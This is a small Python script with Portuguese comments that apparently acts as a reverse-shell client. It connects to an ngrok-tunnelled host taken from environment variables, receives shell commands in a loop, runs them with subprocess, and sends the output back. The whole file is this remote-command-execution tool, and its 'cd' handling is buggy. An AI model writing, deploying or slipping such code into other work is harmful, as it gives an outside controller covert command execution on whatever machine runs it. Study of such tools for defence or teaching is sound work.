import os
import socket
import subprocess
from dotenv import load_dotenv


load_dotenv()
SERVER_HOST = os.getenv('NGROK_URL')
SERVER_PORT = int(os.getenv('NGROK_PORT'))
BUFFER_SIZE = 1024

s = socket.socket()

s.connect((SERVER_HOST, SERVER_PORT))
message = s.recv(BUFFER_SIZE).decode()
print("Server: ", message)

while True:
    # Receber o comando
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    if command.lower().startswith("cd"):
        subprocess.getoutput(command)
        output = subprocess.getoutput("cd")
        s.send(output)
    # Executar o comando
    output = subprocess.getoutput(command)
    # Enviar o resultado
    s.send(output.encode())
# Fechar a conexão
s.close()
